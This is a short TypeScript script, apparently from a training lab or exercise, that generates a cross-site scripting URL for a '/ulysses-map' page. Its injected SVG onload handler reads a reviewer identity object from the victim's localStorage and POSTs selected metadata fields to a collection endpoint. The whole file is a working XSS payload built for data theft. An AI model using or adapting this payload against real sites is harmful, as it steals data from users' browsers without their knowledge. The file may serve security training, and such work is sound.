export function generateAstroXssTarget() {
  const script = "(()=>{const i=JSON.parse(localStorage.getItem('sca_reviewer_identity')||'null'),m=i&&i.metadata||{},fields={};for(const k of ['campaign','migrationJob','directoryAlias','entryUser','legacyComputer','relatedRequestId'])if(typeof m[k]==='string')fields[k]=m[k];return fetch('/api/training/collect/'+new window.URL(window.location.href).searchParams.get('submission'),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fields})})})()";
  return `USEA-TRACKING-NET<svg aria-hidden="true" width="0" height="0" onload="${script}"></svg>`;
}

export function generateAstroXssUrl(origin: string) {
  const url = new URL("/ulysses-map", origin);
  url.searchParams.set("target", generateAstroXssTarget());
  return url.href;
}

if (process.argv[1]?.endsWith("generate-astro-xss-payload.ts")) {
  const origin = process.env.ASTRO_PUBLIC_ORIGIN;
  if (!origin) throw new Error("ASTRO_PUBLIC_ORIGIN is required");
  process.stdout.write(`${generateAstroXssUrl(origin)}\n`);
}
